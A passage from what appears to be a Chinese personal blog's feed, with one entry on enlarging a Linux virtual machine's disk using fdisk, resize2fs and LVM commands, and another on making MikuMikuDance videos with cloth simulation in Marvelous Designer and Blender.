class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">Command (m for help): p  </span><br><span class="line">Disk /dev/sda: 100 GiB, 107374182400 bytes, 209715200 sectors</span><br><span class="line">Disk model: Virtual disk    </span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x07ea7416</span><br><span class="line"></span><br><span class="line">Device     Boot   Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       2048   1050623   1048576  512M  b W95 FAT32</span><br><span class="line">/dev/sda2       1052670 188741631 187688962 89.5G  5 Extended</span><br><span class="line">/dev/sda5       1052672 188741631 187688960 89.5G 83 Linux// 需要扩充的分区，注意记录一下Start sector的值</span><br><span class="line"></span><br><span class="line">Command (m for help): d      // 删除2号分区</span><br><span class="line">Partition number (1,2,5, default 5): 2</span><br><span class="line"></span><br><span class="line">Partition 2 has been deleted.</span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line">Disk /dev/sda: 100 GiB, 107374182400 bytes, 209715200 sectors</span><br><span class="line">Disk model: Virtual disk    </span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x07ea7416</span><br><span class="line"></span><br><span class="line">Device     Boot Start     End Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *     2048 1050623 1048576  512M  b W95 FAT32</span><br><span class="line"></span><br><span class="line">Command (m for help): n//创建新的extend分区</span><br><span class="line">Partition type</span><br><span class="line">   p   primary (1 primary, 0 extended, 3 free)</span><br><span class="line">   e   extended (container for logical partitions)</span><br><span class="line">Select (default p): e</span><br><span class="line">Partition number (2-4, default 2): </span><br><span class="line">First sector (1050624-209715199, default 1050624): // 默认即可，没必要和之前一样</span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (1050624-209715199, default 209715199): </span><br><span class="line"></span><br><span class="line">Created a new partition 2 of type &#x27;Extended&#x27; and of size 99.5 GiB.</span><br><span class="line">Partition #2 contains a vfat signature.</span><br><span class="line"></span><br><span class="line">Do you want to remove the signature? [Y]es/[N]o: Y// 不确定是否必须移除</span><br><span class="line"></span><br><span class="line">The signature will be removed by a write command.</span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line">Disk /dev/sda: 100 GiB, 107374182400 bytes, 209715200 sectors</span><br><span class="line">Disk model: Virtual disk    </span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: dos</span><br><span class="line">Disk identifier: 0x07ea7416</span><br><span class="line"></span><br><span class="line">Device     Boot   Start       End   Sectors  Size Id Type</span><br><span class="line">/dev/sda1  *       2048   1050623   1048576  512M  b W95 FAT32</span><br><span class="line">/dev/sda2       1050624 209715199 208664576 99.5G  5 Extended</span><br><span class="line"></span><br><span class="line">Filesystem/RAID signature on partition 2 will be wiped.</span><br><span class="line"></span><br><span class="line">Command (m for help): n// 新建逻辑分区</span><br><span class="line">All space for primary partitions is in use.</span><br><span class="line">Adding logical partition 5</span><br><span class="line">First sector (1052672-209715199, default 1052672): // 起始sector，一定要和之前一样</span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (1052672-209715199, default 209715199): </span><br><span class="line"></span><br><span class="line">Created a new partition 5 of type &#x27;Linux&#x27; and of size 99.5 GiB.</span><br><span class="line">Partition #5 contains a ext4 signature.</span><br><span class="line"></span><br><span class="line">Do you want to remove the signature? [Y]es/[N]o: Y// 不确定是否必须移除</span><br><span class="line"></span><br><span class="line">The signature will be removed by a write command.</span><br><span class="line"></span><br><span class="line">Command (m for help): w// 写回磁盘</span><br><span class="line">The partition table has been altered.</span><br><span class="line">Failed to add partition 2 to system: Device or resource busy</span><br><span class="line"></span><br><span class="line">The kernel still uses the old partitions. The new table will be used at the next reboot. </span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure><p>因为sda5是sda2 extend的逻辑分区，所以这里直接把sda2整个删了重建，不知道为啥只删sda5再重建的话起始sector不在可选范围里。</p><p>之后新建sda2，选extend不要选primary，新建sda5，如果让选分区类型就选logical，注意新建sda5的时候起始的sector<strong>一定要和之前的分区表一致，不然会丢数据。</strong></p><p>如果要扩充的是primary分区，就直接删除重建对应分区就行，也要保证起始sector一致。</p><h2 id="扩展文件系统"><a href="#扩展文件系统" class="headerlink" title="扩展文件系统"></a>扩展文件系统</h2><p>fdisk将更改写回磁盘后重启一下就能生效了，但是用df看的话可用磁盘空间还是不会变，这是因为虽然分区的容量扩充了，但是上面的文件系统并不知道，需要使用resize2fs将对应分区上的文件系统扩容，之后就能正常使用了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ihopenot@ihopenot-virtual-machine:~$ df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            7.8G     0  7.8G   0% /dev</span><br><span class="line">tmpfs           1.6G  1.6M  1.6G   1% /run</span><br><span class="line">/dev/sda5        88G  7.0G   77G   9% /// sda5大小未改变</span><br><span class="line"></span><br><span class="line">ihopenot@ihopenot-virtual-machine:~$ sudo resize2fs /dev/sda5</span><br><span class="line">resize2fs 1.45.5 (07-Jan-2020)</span><br><span class="line">Filesystem at /dev/sda5 is mounted on /; on-line resizing required</span><br><span class="line">old_desc_blocks = 12, new_desc_blocks = 13</span><br><span class="line">The filesystem on /dev/sda5 is now 26082816 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">ihopenot@ihopenot-virtual-machine:~$ df -h</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">udev            7.8G     0  7.8G   0% /dev</span><br><span class="line">tmpfs           1.6G  1.6M  1.6G   1% /run</span><br><span class="line">/dev/sda5        98G  7.0G   86G   8% /// 成功扩容</span><br></pre></td></tr></table></figure><h1 id="虚拟机硬盘扩充（lvm）"><a href="#虚拟机硬盘扩充（lvm）" class="headerlink" title="虚拟机硬盘扩充（lvm）"></a>虚拟机硬盘扩充（lvm）</h1><p>lvm（<em>Logical Volume Manager</em>）是一个逻辑卷管理器，在物理磁盘上抽象出的逻辑分区，由于直接使用物理磁盘的分区存储扩展和管理起来非常麻烦，比如之前说到的，如果磁盘上未分配的区域不是正好在要扩充的分区后面紧贴着，那么扩展这个分区就相当麻烦。在这种情况下，lvm应运而生。</p><p>在ubuntu安装的过程中，可以选择开启lvm。之后再进行磁盘的扩充就非常容易了。</p><p>扩充lvm的逻辑是，在未分配的磁盘区域或是一块新磁盘上新建一块分区，并在这个分区上创建PV（Physical volume），之后将PV加入到你要扩充的LV（Logical Volume）所在的VG（Volume group），之后扩展LV的容量大小，最后resize一下这个LV上的文件系统。</p><h2 id="查看lvm信息"><a href="#查看lvm信息" class="headerlink" title="查看lvm信息"></a>查看lvm信息</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">ihopenot@ubuntu:~$ lsblk</span><br><span class="line">NAME                      MAJ:MIN RM   SIZE RO TYPE MOUNTPOINTS</span><br><span class="line">sda                         8:0    0    30G  0 disk </span><br><span class="line">├─sda1                      8:1    0     1M  0 part </span><br><span class="line">├─sda2                      8:2    0   1.8G  0 part /boot</span><br><span class="line">└─sda3                      8:3    0  18.2G  0 part </span><br><span class="line">  └─ubuntu--vg-ubuntu--lv 253:0    0    10G  0 lvm  /</span><br><span class="line">  </span><br><span class="line">ihopenot@ubuntu:~$ sudo lvdisplay </span><br><span class="line">  --- Logical volume ---</span><br><span class="line">  LV Path                /dev/ubuntu-vg/ubuntu-lv</span><br><span class="line">  LV Name                ubuntu-lv</span><br><span class="line">  VG Name                ubuntu-vg</span><br><span class="line">  LV UUID                moq0Mb-SRCu-UfxE-8ZGG-l2TN-LYdA-73CuHH</span><br><span class="line">  LV Write Access        read/write</span><br><span class="line">  LV Creation host, time ubuntu-server, 2023-03-29 09:50:31 +0000</span><br><span class="line">  LV Status              available</span><br><span class="line">  # open                 1</span><br><span class="line">  LV Size                10.00 GiB</span><br><span class="line">  Current LE             2560</span><br><span class="line">  Segments               1</span><br><span class="line">  Allocation             inherit</span><br><span class="line">  Read ahead sectors     auto</span><br><span class="line">  - currently set to     256</span><br><span class="line">  Block device           253:0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用lsblk和lvdisplay查看lvm相关信息，可以发现根目录 &#x2F; 是挂载的ubuntu–vg-ubuntu-lv逻辑卷。</p><h2 id="新建分区"><a href="#新建分区" class="headerlink" title="新建分区"></a>新建分区</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Command (m for help): p</span><br><span class="line"></span><br><span class="line">Disk /dev/sda: 30 GiB, 32212254720 bytes, 62914560 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: gpt</span><br><span class="line">Disk identifier: 538FA7A9-20C7-4F29-B05C-881BC791F1DF</span><br><span class="line"></span><br><span class="line">Device       Start      End  Sectors  Size Type</span><br><span class="line">/dev/sda1     2048     4095     2048    1M BIOS boot</span><br><span class="line">/dev/sda2     4096  3719167  3715072  1.8G Linux filesystem</span><br><span class="line">/dev/sda3  3719168 41940991 38221824 18.2G Linux filesystem</span><br><span class="line"></span><br><span class="line">Command (m for help): n// 新建一个分区，使用所有剩余空间</span><br><span class="line">Partition number (4-128, default 4): </span><br><span class="line">First sector (41940992-62914526, default 41940992): </span><br><span class="line">Last sector, +/-sectors or +/-size&#123;K,M,G,T,P&#125; (41940992-62914526, default 62914526): </span><br><span class="line"></span><br><span class="line">Created a new partition 4 of type &#x27;Linux filesystem&#x27; and of size 10 GiB.</span><br><span class="line"></span><br><span class="line">Command (m for help): p</span><br><span class="line">Disk /dev/sda: 30 GiB, 32212254720 bytes, 62914560 sectors</span><br><span class="line">Disk model: VMware Virtual S</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel type: gpt</span><br><span class="line">Disk identifier: 538FA7A9-20C7-4F29-B05C-881BC791F1DF</span><br><span class="line"></span><br><span class="line">Device        Start      End  Sectors  Size Type</span><br><span class="line">/dev/sda1      2048     4095     2048    1M BIOS boot</span><br><span class="line">/dev/sda2      4096  3719167  3715072  1.8G Linux filesystem</span><br><span class="line">/dev/sda3   3719168 41940991 38221824 18.2G Linux filesystem</span><br><span class="line">/dev/sda4  41940992 62914526 20973535   10G Linux filesystem</span><br><span class="line"></span><br><span class="line">Command (m for help): w</span><br><span class="line">The partition table has been altered.</span><br><span class="line">Syncing disks.</span><br></pre></td></tr></table></figure><p>先将物理硬盘中未分配的区域新建一个分区，之后将这个分区合并到vg (volume group) 中去。</p><h2 id="扩充卷组"><a href="#扩充卷组" class="headerlink" title="扩充卷组"></a>扩充卷组</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">ihopenot@ubuntu:~$ sudo vgextend ubuntu-vg /dev/sda4</span><br><span class="line">  Physical volume &quot;/dev/sda4&quot; successfully created.</span><br><span class="line">  Volume group &quot;ubuntu-vg&quot; successfully extended</span><br><span class="line">  </span><br><span class="line">ihopenot@ubuntu:~$ sudo vgdisplay </span><br><span class="line">  --- Volume group ---</span><br><span class="line">  VG Name               ubuntu-vg</span><br><span class="line">  System ID             </span><br><span class="line">  Format                lvm2</span><br><span class="line">  Metadata Areas        2</span><br><span class="line">  Metadata Sequence No  3</span><br><span class="line">  VG Access             read/write</span><br><span class="line">  VG Status             resizable</span><br><span class="line">  MAX LV                0</span><br><span class="line">  Cur LV                1</span><br><span class="line">  Open LV               1</span><br><span class="line">  Max PV                0</span><br><span class="line">  Cur PV                2</span><br><span class="line">  Act PV                2</span><br><span class="line">  VG Size               &lt;28.22 GiB</span><br><span class="line">  PE Size               4.00 MiB</span><br><span class="line">  Total PE              7224</span><br><span class="line">  Alloc PE / Size       2560 / 10.00 GiB</span><br><span class="line">  Free  PE / Size       4664 / &lt;18.22 GiB</span><br><span class="line">  VG UUID               p1xePf-Ye3h-wFoq-sFBX-kRi6-I3qI-wI0SYj</span><br></pre></td></tr></table></figure><p>使用<code>vgextend ubuntu-vg /dev/sda4</code>将在新分区上创建PV并加入ubuntu-vg，可以看到ubuntu-vg中Free  PE &#x2F; Size已经扩充10个G了。</p><h2 id="扩充逻辑卷"><a href="#扩充逻辑卷" class="headerlink" title="扩充逻辑卷"></a>扩充逻辑卷</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ihopenot@ubuntu:~$ df -h</span><br><span class="line">Filesystem                         Size  Used Avail Use% Mounted on</span><br><span class="line">tmpfs                              389M  1.6M  388M   1% /run</span><br><span class="line">/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  3.2G  6.2G  34% /</span><br><span class="line"></span><br><span class="line">ihopenot@ubuntu:~$ sudo lvextend --resizefs -l +50%FREE /dev/ubuntu-vg/ubuntu-lv</span><br><span class="line">  Size of logical volume ubuntu-vg/ubuntu-lv changed from 10.00 GiB (2560 extents) to &lt;19.11 GiB (4892 extents).</span><br><span class="line">  Logical volume ubuntu-vg/ubuntu-lv successfully resized.</span><br><span class="line">resize2fs 1.46.5 (30-Dec-2021)</span><br><span class="line">Filesystem at /dev/mapper/ubuntu--vg-ubuntu--lv is mounted on /; on-line resizing required</span><br><span class="line">old_desc_blocks = 2, new_desc_blocks = 3</span><br><span class="line">The filesystem on /dev/mapper/ubuntu--vg-ubuntu--lv is now 5009408 (4k) blocks long.</span><br><span class="line"></span><br><span class="line">ihopenot@ubuntu:~$ df -h</span><br><span class="line">Filesystem                         Size  Used Avail Use% Mounted on</span><br><span class="line">tmpfs                              389M  1.6M  388M   1% /run</span><br><span class="line">/dev/mapper/ubuntu--vg-ubuntu--lv   19G  3.7G   15G  21% /</span><br></pre></td></tr></table></figure><p>使用<code>lvextend --resizefs -l +50%FREE /dev/ubuntu-vg/ubuntu-lv</code>来扩充逻辑卷的大小，<code>--resizefs</code>参数会在扩充完成后自动扩充逻辑卷上文件系统的大小。<code>-l +50%FREE</code>指定扩容的大小，这里将50%的剩余空间分配到了当前逻辑卷，可以看到根目录 &#x2F; 的容量扩充了9个G。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;由于虚拟机硬盘经常被干满，就需要经常去加盘，每次加盘都要上网搜一下fdisk怎么用，很麻烦，因此，在这篇博客中我将总结一下这个过程，以便以后可以直接查阅。&lt;/p&gt;
&lt;h1 id=&quot;虚拟机硬盘扩充（fdisk）&quot;&gt;&lt;a href=&quot;#虚拟机硬盘扩充（fdisk）&quot; class=&quot;headerlink&quot; title=&quot;虚拟机硬盘扩充（fdisk）&quot;&gt;&lt;/a&gt;虚拟机硬盘扩充（fdisk）&lt;/h1&gt;&lt;p&gt;当虚拟机硬盘空间不足时，我们该如何处理？通常有两种选择：添加一块新硬盘或者增大原有硬盘的容量。&lt;/p&gt;
&lt;p&gt;对于不使用LVM（逻辑卷管理）的情况，添加新硬盘并不容易直接扩展原始分区的容量。这对于像我这样将整个硬盘挂载在根目录（&amp;#x2F;）下的用户来说并不友好。&lt;/p&gt;
&lt;p&gt;因此，通常我们会选择增大原有硬盘的容量。这样一来，fdisk就可以识别到硬盘容量的增加。但是，由于分区表尚未修改，实际可用空间并不会有所变化。&lt;/p&gt;
&lt;p&gt;接下来，我们将通过fdisk来扩大分区容量。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数据无价，谨慎操作，如有重要信息，务必提前备份。&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="运维" scheme="https://ihopenot.github.io/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>MMD</title>
    <link href="https://ihopenot.github.io/2022/11/30/MMD/"/>
    <id>https://ihopenot.github.io/2022/11/30/MMD/</id>
    <published>2022-11-30T12:42:25.000Z</published>
    <updated>2023-08-24T14:56:56.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MMD"><a href="#MMD" class="headerlink" title="MMD"></a>MMD</h1><p>全称mikumiku dance（mmd），让miku跳舞的软件。mmd这个软件挺老的，最新的9.32也是三年前的版本了，mmd本身上手难度低，相对于其他的一些专业3d工具c4d, blender甚至ue5来说下限高，初心者10分钟可能就能做出来能看的mmd了。并且有mme（mikumiku effects）的加持，上限也不低。</p><p>这几天稍微玩了下mmd，这里记录下流程和一些踩的坑。</p><h2 id="MMD-1"><a href="#MMD-1" class="headerlink" title="MMD"></a>MMD</h2><p>mmd作为入门级的mmd制作工具，功能挺全的，一般流程是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">下载人物模型，动作，镜头动作并添加</span><br><span class="line">修改人物动作，镜头动作适配模型大小</span><br><span class="line">下载场景模型并添加</span><br><span class="line">修改人物/镜头的动作/位置适配场景</span><br><span class="line">添加mme，完善细节</span><br></pre></td></tr></table></figure><p>上面并没有明显顺序关系，想按什么顺序来都行。</p><span id="more"></span><h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><p>模型下载一般去<a href="https://www.aplaybox.com/">模之屋</a>或者<a href="https://bowlroll.net/">碗？</a>，上面一般都有各种模型，但是使用的时候注意下<strong>配布规则</strong>，好像mmd圈挺重视这个东西的。</p><p>mmd模型后缀是pmx，使用的时候直接拖到mmd里面就行了，动作包括镜头动作后缀是vmd，也是拖进mmd就行，但是拖进去之前注意下mmd里面选中的模型是你想要绑定动作的模型。下图红框的部分可以切换当前选中的模型。</p><img src="/2022/11/30/MMD/change_model.png" class="" title="切换当前选中模型"><p>一般来说动作模型和人物模型是不匹配的，因为动作模型不是在这个人物模型上做的，但是mmd自己可以自动适配上去，一般在人物体型和原始模型体型相近的时候效果很好，但是如果把成人体型的动作套在萝莉模型上就会很别扭，比如跨步的幅度会非常大，很不自然。还有一些奇葩手脚特别长的模型，自动适配效果很差，就需要手动修复一下动作。</p><h3 id="模型动作修复"><a href="#模型动作修复" class="headerlink" title="模型动作修复"></a>模型动作修复</h3><p>比如这里用的nahida的模型，相比成人体型动作幅度要调小一点，这里选中nahida的模型，右上角edit，选择所有骨骼帧，然后设置缩放和偏移，这里是设置的缩放0.7倍。</p><p><img src="/nahida_before.png" alt="nahida_before"><img src="/nahida_after.png" alt="nahida_after"></p><p>可以看到自然了许多，还有些小动作由于比例问题还需要微调，可以在右边栏里选中要微调的帧和骨骼之后设置缩放和偏移。可以直接点选，或者选定行首之后用下面的range-sel范围选取。</p><p>镜头动作别忘了和人物动作同步修改，不然镜头跑飞了。</p><p>场景添加完之后人物和场景要配合一下，尽量人物不要穿模，镜头运镜的时候注意不要被场景物件遮挡了，如果不幸被挡住了，可以试试改模或者改运镜，</p><h3 id="MME"><a href="#MME" class="headerlink" title="MME"></a>MME</h3><p>根据需求添加mme来提高渲染质量和完善场景细节，比如一些星星点点啥的。</p><p>mme是个mmd插件要单独装，装好之后点左上角MMEffect可以打开mme管理器，mme相关的配置一般都在这里，还有一些配置会丢到表情菜单里，比如ray的一些控制模块，通过控制这些模块的“表情”来改变渲染效果，比如下面这个ray_controller，你可以控制它mouth的参数来改变镜头的焦距等。</p><img src="/2022/11/30/MMD/facial.png" class="" title="facial"><p>一般来说需要把mme中的.x文件拖进mmd里，别的更多的配置得看每个mme单独说明。</p><p>用的不多，就玩过ray，感觉上了ray之后手动调节的地方可能就是各个部位的材质，在ray的渲染下会比mmd原始渲染引擎好得多，原版ray感觉偏写实一些，可能得上一些卡通化风格的mme来更可爱一些（如果你需要的话）。</p><p>还有就是镜头渲染，景深和对焦啥的可能得手动调一下，有时候对焦对歪来对到背景上了，或者一瞬间的失焦，都很影响感官。</p><p>之后可能再试下别的mme，之后用到的mmdbridge感觉是内嵌了一套卡通化的渲染，感觉比原版效果好一些。</p><h2 id="布料解算"><a href="#布料解算" class="headerlink" title="布料解算"></a>布料解算</h2><p>布料解算用的软件是MarvelousDesigner（MD），解算效果应该是比较好的，此外好像blender和c4d里都自带有布料解算的功能，这里主要是用的MD来做。布料配布也可以在上面下载模型的网站找到。</p><p>首先要布料解算需要一个MD支持的模型，但是MD不支持mmd的pmx模型，所以需要使用mmdbridge将pmx模型导出成MD支持的模型，这里导出的是.abc格式的模型。并且布料解算需要一个素体模型，如果模型本身带有衣服可能需要先把衣服去掉，除非你想在mmd里穿两件衣服（</p><p>导出之前在mmd里先把动作都修好，穿模啥的尽量不要有，特别是在布料解算时衣服穿上的部位尽量别穿模，不然布料解算的时候再修就特别麻烦了。还有一点是再导入模型动作的之后尽量预留10帧左右，也就是动作开始最好是在10帧左右，一开始的10帧是留给布料解算穿衣服用的，因为衣服一般设计时的模特是双手打开站立，也就是模型刚导入时的动作。如果动作从第0帧开始的话，模型一进去就是准备跳舞的姿势，再想把衣服套上去就很麻烦了。同时10帧的时间也是给模型一点缓冲时间，让模型动作平稳过渡到准备跳舞的姿势，如果只设置2，3帧的缓冲可能使得动作幅度太大，拉扯衣服。</p><p>然后使用mmdbridge导出，导出的时候帧率选30帧，选60帧的话会少一半，可能需要把导出帧范围也扩大一倍？</p><p>导出之后的模型就可以丢进blender或者c4d里，把多余的配饰，手，脚，头啥的，总之是布料解算过程中不用穿衣服的部位最好都给去掉，减少穿模和意外拉扯衣物的可能。如果想切除模型的某一个部位，但是这个部位和其他部位连在一起可以手动删除多边形，我是用的C4D删。穿模会严重影响布料解算的效率并且可能使MD程序崩溃，所以事前工作尽量做好一点。最后模型类似与这种：</p><img src="/2022/11/30/MMD/body_model.png" class="" title="body model"><p>之后导出.abc丢给MD，把服装和人物对上差不多了就可以直接工具栏里3D服装-&gt;将所有针固定到虚拟模特上，这样就算把衣服和模特绑在一起了，看下绑定点有没有绑歪的修一下，就差不多了。之后在服装上面看着打些固定点就行了，主要是不要让衣服太飘，比如模特旋转时候的裙摆，要是不打固定点裙摆可能直接飘成水平的了。</p><img src="/2022/11/30/MMD/anchor.png" class="" title="anchor"><p>差不多了就直接进入animation模式进行解算。</p><img src="/2022/11/30/MMD/MD_animation.png" class="" title="MD animation"><p>最终生成的时候模拟品质使用<em>动画（完成）</em>就行，预览的话可以开gpu加速。</p><p>最终生成一定不要开gpu，gpu模拟质量很差，大量穿模，有可能是我姿势不对？</p><p>最终生成cpu核数12就行，据说12就是最好的，开多了反而慢。</p><h3 id="C4D删除部位后丢失动作"><a href="#C4D删除部位后丢失动作" class="headerlink" title="C4D删除部位后丢失动作"></a>C4D删除部位后丢失动作</h3><p>C4D里面删除部位如果删除了一些关键点的话会导致整个模型动作丢失，解决方法是先把动作烘焙上去，具体操作是先打开timeline。</p><img src="/2022/11/30/MMD/timeline_button.png" class="" title="timline button"><p>然后选中模型，开始烘培。</p><img src="/2022/11/30/MMD/bake_objects.png" class="" title="bake objects"><p>之后再烘焙好的模型上操作就没问题了。</p><h2 id="Blender"><a href="#Blender" class="headerlink" title="Blender"></a>Blender</h2><p>MD解算完之后导出没法导出mmd支持的pmx格式，我也没找到什么能.abc转.pmx的工具，后续工作感觉回到mmd有点困难，还是得转移到专业3D软件上去做。</p><p>之后做的事情和mmd也差不多，找个场景，修下镜头啥的，我也不是很熟。</p><p>吐槽一下，blender渲染慢的要死，还会把整个程序卡没响应，真的难受。</p><p>一点小坑：导入模型的时候记得把场景帧率调到和模型相同，不然导入进来动作速度会不匹配。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;MMD&quot;&gt;&lt;a href=&quot;#MMD&quot; class=&quot;headerlink&quot; title=&quot;MMD&quot;&gt;&lt;/a&gt;MMD&lt;/h1&gt;&lt;p&gt;全称mikumiku dance（mmd），让miku跳舞的软件。mmd这个软件挺老的，最新的9.32也是三年前的版本了，mmd本身上手难度低，相对于其他的一些专业3d工具c4d, blender甚至ue5来说下限高，初心者10分钟可能就能做出来能看的mmd了。并且有mme（mikumiku effects）的加持，上限也不低。&lt;/p&gt;
&lt;p&gt;这几天稍微玩了下mmd，这里记录下流程和一些踩的坑。&lt;/p&gt;
&lt;h2 id=&quot;MMD-1&quot;&gt;&lt;a href=&quot;#MMD-1&quot; class=&quot;headerlink&quot; title=&quot;MMD&quot;&gt;&lt;/a&gt;MMD&lt;/h2&gt;&lt;p&gt;mmd作为入门级的mmd制作工具，功能挺全的，一般流程是：&lt;/p&gt;
